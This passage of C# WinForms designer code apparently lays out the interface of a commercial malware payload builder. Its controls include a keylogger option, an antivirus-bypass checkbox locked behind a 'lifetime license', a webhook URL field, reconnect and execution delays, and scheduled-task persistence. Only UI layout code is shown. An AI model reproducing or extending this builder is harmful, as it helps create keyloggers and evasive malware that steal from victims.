        stateProperties66.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties66.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties66.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.bunifuTextBox_0.OnDisabledState = stateProperties66;
        stateProperties67.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties67.FillColor = System.Drawing.Color.Empty;
        stateProperties67.ForeColor = System.Drawing.Color.Empty;
        stateProperties67.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.bunifuTextBox_0.OnHoverState = stateProperties67;
        stateProperties68.BorderColor = System.Drawing.Color.Silver;
        stateProperties68.FillColor = System.Drawing.Color.White;
        stateProperties68.ForeColor = System.Drawing.Color.Empty;
        stateProperties68.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.bunifuTextBox_0.OnIdleState = stateProperties68;
        this.bunifuTextBox_0.Padding = new System.Windows.Forms.Padding(3);
        this.bunifuTextBox_0.PasswordChar = '\0';
        this.bunifuTextBox_0.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.bunifuTextBox_0.PlaceholderText = "Webhooks {URL}";
        this.bunifuTextBox_0.ReadOnly = true;
        this.bunifuTextBox_0.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.bunifuTextBox_0.SelectedText = "";
        this.bunifuTextBox_0.SelectionLength = 0;
        this.bunifuTextBox_0.SelectionStart = 0;
        this.bunifuTextBox_0.ShortcutsEnabled = true;
        this.bunifuTextBox_0.Size = new System.Drawing.Size(491, 28);
        this.bunifuTextBox_0.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.bunifuTextBox_0.TabIndex = 650;
        this.bunifuTextBox_0.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.bunifuTextBox_0.TextMarginBottom = 0;
        this.bunifuTextBox_0.TextMarginLeft = 3;
        this.bunifuTextBox_0.TextMarginTop = 1;
        this.bunifuTextBox_0.TextPlaceholder = "Webhooks {URL}";
        this.bunifuTextBox_0.UseSystemPasswordChar = false;
        this.bunifuTextBox_0.WordWrap = true;
        // 
        // pictureBox4
        // 
        this.pictureBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.pictureBox4.Location = new System.Drawing.Point(31, 453);
        this.pictureBox4.Name = "pictureBox4";
        this.pictureBox4.Size = new System.Drawing.Size(30, 22);
        this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox4.TabIndex = 576;
        this.pictureBox4.TabStop = false;
        // 
        // bunifuLabel1
        // 
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
        this.bunifuLabel1.Location = new System.Drawing.Point(67, 457);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(674, 15);
        this.bunifuLabel1.TabIndex = 577;
        this.bunifuLabel1.Text = "This builder generates payload based on your choice of features The more features" +
" you choose, the bigger the basic payload size\r\n";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ImageBypassAV
        // 
        this.ImageBypassAV.BackColor = System.Drawing.Color.White;
        this.ImageBypassAV.Image = ((System.Drawing.Image)(resources.GetObject("ImageBypassAV.Image")));
        this.ImageBypassAV.Location = new System.Drawing.Point(337, 367);
        this.ImageBypassAV.Name = "ImageBypassAV";
        this.ImageBypassAV.Size = new System.Drawing.Size(30, 21);
        this.ImageBypassAV.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageBypassAV.TabIndex = 649;
        this.ImageBypassAV.TabStop = false;
        this.ImageBypassAV.Visible = false;
        // 
        // InfoBypassAV
        // 
        this.InfoBypassAV.AllowParentOverrides = false;
        this.InfoBypassAV.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.InfoBypassAV.AutoEllipsis = false;
        this.InfoBypassAV.AutoSize = false;
        this.InfoBypassAV.BackColor = System.Drawing.Color.White;
        this.InfoBypassAV.Cursor = System.Windows.Forms.Cursors.Default;
        this.InfoBypassAV.CursorType = System.Windows.Forms.Cursors.Default;
        this.InfoBypassAV.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.InfoBypassAV.ForeColor = System.Drawing.Color.Red;
        this.InfoBypassAV.Location = new System.Drawing.Point(337, 394);
        this.InfoBypassAV.Name = "InfoBypassAV";
        this.InfoBypassAV.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.InfoBypassAV.Size = new System.Drawing.Size(206, 42);
        this.InfoBypassAV.TabIndex = 648;
        this.InfoBypassAV.Text = "To activate this feature, you must upgrade to a lifetime license";
        this.InfoBypassAV.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.InfoBypassAV.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.InfoBypassAV.Visible = false;
        // 
        // keyloggerOfflien
        // 
        this.keyloggerOfflien.AllowBindingControlAnimation = true;
        this.keyloggerOfflien.AllowBindingControlColorChanges = false;
        this.keyloggerOfflien.AllowBindingControlLocation = true;
        this.keyloggerOfflien.AllowCheckBoxAnimation = true;
        this.keyloggerOfflien.AllowCheckmarkAnimation = true;
        this.keyloggerOfflien.AllowOnHoverStates = true;
        this.keyloggerOfflien.AutoCheck = true;
        this.keyloggerOfflien.BackColor = System.Drawing.Color.Transparent;
        this.keyloggerOfflien.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("keyloggerOfflien.BackgroundImage")));
        this.keyloggerOfflien.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.keyloggerOfflien.BindingControl = this.TxkeyloggerOfflien;
        this.keyloggerOfflien.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.keyloggerOfflien.BorderRadius = 6;
        this.keyloggerOfflien.Checked = false;
        this.keyloggerOfflien.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.keyloggerOfflien.Cursor = System.Windows.Forms.Cursors.Hand;
        this.keyloggerOfflien.CustomCheckmarkImage = null;
        this.keyloggerOfflien.Location = new System.Drawing.Point(38, 416);
        this.keyloggerOfflien.MinimumSize = new System.Drawing.Size(17, 17);
        this.keyloggerOfflien.Name = "keyloggerOfflien";
        this.keyloggerOfflien.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.keyloggerOfflien.OnCheck.BorderRadius = 6;
        this.keyloggerOfflien.OnCheck.BorderThickness = 2;
        this.keyloggerOfflien.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.keyloggerOfflien.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.keyloggerOfflien.OnCheck.CheckmarkThickness = 2;
        this.keyloggerOfflien.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.keyloggerOfflien.OnDisable.BorderRadius = 6;
        this.keyloggerOfflien.OnDisable.BorderThickness = 2;
        this.keyloggerOfflien.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.keyloggerOfflien.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.keyloggerOfflien.OnDisable.CheckmarkThickness = 2;
        this.keyloggerOfflien.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.keyloggerOfflien.OnHoverChecked.BorderRadius = 6;
        this.keyloggerOfflien.OnHoverChecked.BorderThickness = 2;
        this.keyloggerOfflien.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.keyloggerOfflien.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.keyloggerOfflien.OnHoverChecked.CheckmarkThickness = 2;
        this.keyloggerOfflien.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.keyloggerOfflien.OnHoverUnchecked.BorderRadius = 6;
        this.keyloggerOfflien.OnHoverUnchecked.BorderThickness = 1;
        this.keyloggerOfflien.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.keyloggerOfflien.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.keyloggerOfflien.OnUncheck.BorderRadius = 6;
        this.keyloggerOfflien.OnUncheck.BorderThickness = 1;
        this.keyloggerOfflien.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.keyloggerOfflien.Size = new System.Drawing.Size(21, 21);
        this.keyloggerOfflien.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.keyloggerOfflien.TabIndex = 647;
        this.keyloggerOfflien.ThreeState = false;
        this.keyloggerOfflien.ToolTipText = null;
        // 
        // TxkeyloggerOfflien
        // 
        this.TxkeyloggerOfflien.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxkeyloggerOfflien.AutoSize = true;
        this.TxkeyloggerOfflien.BackColor = System.Drawing.Color.Transparent;
        this.TxkeyloggerOfflien.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxkeyloggerOfflien.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxkeyloggerOfflien.ForeColor = System.Drawing.Color.Black;
        this.TxkeyloggerOfflien.Location = new System.Drawing.Point(62, 420);
        this.TxkeyloggerOfflien.Name = "TxkeyloggerOfflien";
        this.TxkeyloggerOfflien.Size = new System.Drawing.Size(98, 15);
        this.TxkeyloggerOfflien.TabIndex = 646;
        this.TxkeyloggerOfflien.Text = "keylogger Offlien";
        // 
        // PanelDelay
        // 
        this.PanelDelay.Controls.Add(this.BuilderExcutionDelay);
        this.PanelDelay.Enabled = false;
        this.PanelDelay.Location = new System.Drawing.Point(581, 65);
        this.PanelDelay.Name = "PanelDelay";
        this.PanelDelay.Size = new System.Drawing.Size(103, 34);
        this.PanelDelay.TabIndex = 645;
        // 
        // BuilderExcutionDelay
        // 
        this.BuilderExcutionDelay.AcceptsReturn = false;
        this.BuilderExcutionDelay.AcceptsTab = false;
        this.BuilderExcutionDelay.AnimationSpeed = 200;
        this.BuilderExcutionDelay.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderExcutionDelay.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderExcutionDelay.AutoSizeHeight = true;
        this.BuilderExcutionDelay.BackColor = System.Drawing.Color.Transparent;
        this.BuilderExcutionDelay.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderExcutionDelay.BackgroundImage")));
        this.BuilderExcutionDelay.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderExcutionDelay.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderExcutionDelay.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderExcutionDelay.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderExcutionDelay.BorderRadius = 2;
        this.BuilderExcutionDelay.BorderThickness = 1;
        this.BuilderExcutionDelay.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderExcutionDelay.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderExcutionDelay.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderExcutionDelay.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderExcutionDelay.DefaultText = "3";
        this.BuilderExcutionDelay.FillColor = System.Drawing.Color.White;
        this.BuilderExcutionDelay.HideSelection = true;
        this.BuilderExcutionDelay.IconLeft = null;
        this.BuilderExcutionDelay.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderExcutionDelay.IconPadding = 10;
        this.BuilderExcutionDelay.IconRight = null;
        this.BuilderExcutionDelay.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderExcutionDelay.Lines = new string[] {
        "3"};
        this.BuilderExcutionDelay.Location = new System.Drawing.Point(3, 3);
        this.BuilderExcutionDelay.MaxLength = 32767;
        this.BuilderExcutionDelay.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderExcutionDelay.Modified = false;
        this.BuilderExcutionDelay.Multiline = false;
        this.BuilderExcutionDelay.Name = "BuilderExcutionDelay";
        stateProperties69.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties69.FillColor = System.Drawing.Color.Empty;
        stateProperties69.ForeColor = System.Drawing.Color.Empty;
        stateProperties69.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderExcutionDelay.OnActiveState = stateProperties69;
        stateProperties70.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties70.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties70.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties70.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderExcutionDelay.OnDisabledState = stateProperties70;
        stateProperties71.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties71.FillColor = System.Drawing.Color.Empty;
        stateProperties71.ForeColor = System.Drawing.Color.Empty;
        stateProperties71.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderExcutionDelay.OnHoverState = stateProperties71;
        stateProperties72.BorderColor = System.Drawing.Color.Silver;
        stateProperties72.FillColor = System.Drawing.Color.White;
        stateProperties72.ForeColor = System.Drawing.Color.Empty;
        stateProperties72.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderExcutionDelay.OnIdleState = stateProperties72;
        this.BuilderExcutionDelay.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderExcutionDelay.PasswordChar = '\0';
        this.BuilderExcutionDelay.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderExcutionDelay.PlaceholderText = "0";
        this.BuilderExcutionDelay.ReadOnly = false;
        this.BuilderExcutionDelay.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderExcutionDelay.SelectedText = "";
        this.BuilderExcutionDelay.SelectionLength = 0;
        this.BuilderExcutionDelay.SelectionStart = 0;
        this.BuilderExcutionDelay.ShortcutsEnabled = true;
        this.BuilderExcutionDelay.Size = new System.Drawing.Size(98, 28);
        this.BuilderExcutionDelay.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderExcutionDelay.TabIndex = 604;
        this.BuilderExcutionDelay.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderExcutionDelay.TextMarginBottom = 0;
        this.BuilderExcutionDelay.TextMarginLeft = 3;
        this.BuilderExcutionDelay.TextMarginTop = 1;
        this.BuilderExcutionDelay.TextPlaceholder = "0";
        this.BuilderExcutionDelay.UseSystemPasswordChar = false;
        this.BuilderExcutionDelay.WordWrap = true;
        this.BuilderExcutionDelay.KeyDown += new System.Windows.Forms.KeyEventHandler(this.BuilderExcutionDelay_KeyDown);
        this.BuilderExcutionDelay.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.BuilderExcutionDelay_KeyPress);
        // 
        // PanelReDelay
        // 
        this.PanelReDelay.Controls.Add(this.BuilderReconnectDelay);
        this.PanelReDelay.Enabled = false;
        this.PanelReDelay.Location = new System.Drawing.Point(221, 212);
        this.PanelReDelay.Name = "PanelReDelay";
        this.PanelReDelay.Size = new System.Drawing.Size(101, 34);
        this.PanelReDelay.TabIndex = 644;
        // 
        // BuilderReconnectDelay
        // 
        this.BuilderReconnectDelay.AcceptsReturn = false;
        this.BuilderReconnectDelay.AcceptsTab = false;
        this.BuilderReconnectDelay.AnimationSpeed = 200;
        this.BuilderReconnectDelay.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderReconnectDelay.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderReconnectDelay.AutoSizeHeight = true;
        this.BuilderReconnectDelay.BackColor = System.Drawing.Color.Transparent;
        this.BuilderReconnectDelay.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderReconnectDelay.BackgroundImage")));
        this.BuilderReconnectDelay.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderReconnectDelay.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderReconnectDelay.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderReconnectDelay.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderReconnectDelay.BorderRadius = 2;
        this.BuilderReconnectDelay.BorderThickness = 1;
        this.BuilderReconnectDelay.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderReconnectDelay.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderReconnectDelay.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderReconnectDelay.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderReconnectDelay.DefaultText = "3";
        this.BuilderReconnectDelay.FillColor = System.Drawing.Color.White;
        this.BuilderReconnectDelay.HideSelection = true;
        this.BuilderReconnectDelay.IconLeft = null;
        this.BuilderReconnectDelay.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderReconnectDelay.IconPadding = 10;
        this.BuilderReconnectDelay.IconRight = null;
        this.BuilderReconnectDelay.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderReconnectDelay.Lines = new string[] {
        "3"};
        this.BuilderReconnectDelay.Location = new System.Drawing.Point(3, 3);
        this.BuilderReconnectDelay.MaxLength = 32767;
        this.BuilderReconnectDelay.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderReconnectDelay.Modified = false;
        this.BuilderReconnectDelay.Multiline = false;
        this.BuilderReconnectDelay.Name = "BuilderReconnectDelay";
        stateProperties73.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties73.FillColor = System.Drawing.Color.Empty;
        stateProperties73.ForeColor = System.Drawing.Color.Empty;
        stateProperties73.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderReconnectDelay.OnActiveState = stateProperties73;
        stateProperties74.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties74.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties74.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties74.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderReconnectDelay.OnDisabledState = stateProperties74;
        stateProperties75.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties75.FillColor = System.Drawing.Color.Empty;
        stateProperties75.ForeColor = System.Drawing.Color.Empty;
        stateProperties75.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderReconnectDelay.OnHoverState = stateProperties75;
        stateProperties76.BorderColor = System.Drawing.Color.Silver;
        stateProperties76.FillColor = System.Drawing.Color.White;
        stateProperties76.ForeColor = System.Drawing.Color.Empty;
        stateProperties76.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderReconnectDelay.OnIdleState = stateProperties76;
        this.BuilderReconnectDelay.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderReconnectDelay.PasswordChar = '\0';
        this.BuilderReconnectDelay.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderReconnectDelay.PlaceholderText = "0";
        this.BuilderReconnectDelay.ReadOnly = false;
        this.BuilderReconnectDelay.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderReconnectDelay.SelectedText = "";
        this.BuilderReconnectDelay.SelectionLength = 0;
        this.BuilderReconnectDelay.SelectionStart = 0;
        this.BuilderReconnectDelay.ShortcutsEnabled = true;
        this.BuilderReconnectDelay.Size = new System.Drawing.Size(96, 28);
        this.BuilderReconnectDelay.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderReconnectDelay.TabIndex = 604;
        this.BuilderReconnectDelay.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderReconnectDelay.TextMarginBottom = 0;
        this.BuilderReconnectDelay.TextMarginLeft = 3;
        this.BuilderReconnectDelay.TextMarginTop = 1;
        this.BuilderReconnectDelay.TextPlaceholder = "0";
        this.BuilderReconnectDelay.UseSystemPasswordChar = false;
        this.BuilderReconnectDelay.WordWrap = true;
        this.BuilderReconnectDelay.KeyDown += new System.Windows.Forms.KeyEventHandler(this.BuilderExcutionDelay_KeyDown);
        this.BuilderReconnectDelay.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.BuilderExcutionDelay_KeyPress);
        // 
        // PanelTask
        // 
        this.PanelTask.Controls.Add(this.ComDownTasks);
        this.PanelTask.Enabled = false;
        this.PanelTask.Location = new System.Drawing.Point(221, 256);
        this.PanelTask.Name = "PanelTask";
        this.PanelTask.Size = new System.Drawing.Size(101, 33);
        this.PanelTask.TabIndex = 643;
        // 
        // ComDownTasks
        // 
        this.ComDownTasks.BackColor = System.Drawing.Color.Transparent;
        this.ComDownTasks.BackgroundColor = System.Drawing.Color.White;
        this.ComDownTasks.BorderColor = System.Drawing.Color.Silver;
        this.ComDownTasks.BorderRadius = 1;
        this.ComDownTasks.Color = System.Drawing.Color.Silver;
        this.ComDownTasks.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.ComDownTasks.DisabledBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.ComDownTasks.DisabledBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.ComDownTasks.DisabledColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.ComDownTasks.DisabledForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        this.ComDownTasks.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.ComDownTasks.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.ComDownTasks.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.ComDownTasks.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ComDownTasks.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.ComDownTasks.FillDropDown = true;
        this.ComDownTasks.FillIndicator = false;
        this.ComDownTasks.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.ComDownTasks.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ComDownTasks.ForeColor = System.Drawing.Color.Black;
        this.ComDownTasks.FormattingEnabled = true;
        this.ComDownTasks.Icon = null;
        this.ComDownTasks.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.ComDownTasks.IndicatorColor = System.Drawing.Color.DarkGray;
        this.ComDownTasks.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.ComDownTasks.IndicatorThickness = 2;
        this.ComDownTasks.IsDropdownOpened = false;
        this.ComDownTasks.ItemBackColor = System.Drawing.Color.White;
        this.ComDownTasks.ItemBorderColor = System.Drawing.Color.White;
        this.ComDownTasks.ItemForeColor = System.Drawing.Color.Black;
        this.ComDownTasks.ItemHeight = 20;
        this.ComDownTasks.ItemHighLightColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ComDownTasks.ItemHighLightForeColor = System.Drawing.Color.White;
        this.ComDownTasks.Items.AddRange(new object[] {
            "Hourly",
            "Daily",
            "Weekly"});
        this.ComDownTasks.ItemTopMargin = 3;
        this.ComDownTasks.Location = new System.Drawing.Point(3, 3);
        this.ComDownTasks.Name = "ComDownTasks";
        this.ComDownTasks.Size = new System.Drawing.Size(96, 26);
        this.ComDownTasks.TabIndex = 617;
        this.ComDownTasks.Text = null;
        this.ComDownTasks.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.ComDownTasks.TextLeftMargin = 5;
        // 
        // BaypassAV
        // 
        this.BaypassAV.AllowBindingControlAnimation = true;
        this.BaypassAV.AllowBindingControlColorChanges = false;
        this.BaypassAV.AllowBindingControlLocation = true;
        this.BaypassAV.AllowCheckBoxAnimation = true;
        this.BaypassAV.AllowCheckmarkAnimation = true;
        this.BaypassAV.AllowOnHoverStates = true;
        this.BaypassAV.AutoCheck = true;
        this.BaypassAV.BackColor = System.Drawing.Color.Transparent;
        this.BaypassAV.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BaypassAV.BackgroundImage")));
        this.BaypassAV.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BaypassAV.BindingControl = this.label28;
        this.BaypassAV.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BaypassAV.BorderRadius = 6;
        this.BaypassAV.Checked = false;
        this.BaypassAV.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BaypassAV.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BaypassAV.CustomCheckmarkImage = null;
        this.BaypassAV.Location = new System.Drawing.Point(373, 367);
        this.BaypassAV.MinimumSize = new System.Drawing.Size(17, 17);
        this.BaypassAV.Name = "BaypassAV";
        this.BaypassAV.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BaypassAV.OnCheck.BorderRadius = 6;
        this.BaypassAV.OnCheck.BorderThickness = 2;
        this.BaypassAV.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BaypassAV.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BaypassAV.OnCheck.CheckmarkThickness = 2;
        this.BaypassAV.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BaypassAV.OnDisable.BorderRadius = 6;
        this.BaypassAV.OnDisable.BorderThickness = 2;
        this.BaypassAV.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BaypassAV.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BaypassAV.OnDisable.CheckmarkThickness = 2;
        this.BaypassAV.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BaypassAV.OnHoverChecked.BorderRadius = 6;
        this.BaypassAV.OnHoverChecked.BorderThickness = 2;
        this.BaypassAV.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BaypassAV.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BaypassAV.OnHoverChecked.CheckmarkThickness = 2;
        this.BaypassAV.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
